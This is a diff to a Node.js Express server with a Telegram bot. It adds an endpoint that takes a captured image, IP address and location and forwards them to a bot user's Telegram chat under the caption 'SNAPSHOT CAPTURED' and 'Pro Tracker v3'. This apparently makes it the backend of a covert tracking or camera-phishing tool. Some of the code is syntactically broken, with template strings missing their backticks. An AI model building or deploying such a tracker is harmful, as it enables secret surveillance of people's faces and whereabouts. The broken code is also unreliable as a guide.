@@ -263,19 +263,43 @@ Select a module below.`,
 });
 });
 
-// ===== Web Server =====
+
+// ===== Serve Frontend =====
 app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "public/index.html"));
+res.sendFile(path.join(__dirname, "public/index.html"));
+});
+
+// ===== API to receive image + IP + location =====
+app.post("/api/capture", async (req, res) => {
+try {
+const { image, token, ip, location } = req.body;
+if (!image) return res.status(400).json({ error: "No image provided" });
+if (!token || !activeUsers[token]) return res.status(400).json({ error: "Invalid or expired token" });
+
+const chat_id = activeUsers[token].chat_id;  
+const buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");  
+
+await bot.telegram.sendPhoto(chat_id, { source: buffer }, {  
+  caption: 📸 <b>SNAPSHOT CAPTURED</b>
+
+🌐 <b>IP Address:</b> ${ip}
+📍 <b>Location:</b> ${location}
+
+🛰 <b>Tracker:</b> Pro Tracker v3,
+parse_mode: "HTML"
+});
+
+res.json({ status: "success", message: "Image + IP + Location sent" });
+
+} catch (err) {
+console.error(err);
+res.status(500).json({ error: "Server error" });
+}
 });
 
 // ===== Start Server =====
 const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(Server running on port ${PORT}));
 
-app.listen(PORT, () => {
-  console.log("Server running on port", PORT);
-});
-
-// ===== Start Bot =====
-bot.launch().then(() => {
-  console.log("Telegram bot running");
-});
+// Use long polling for simplicity (no webhook required)
+bot.launch().then(() => console.log("Telegram bot running"));
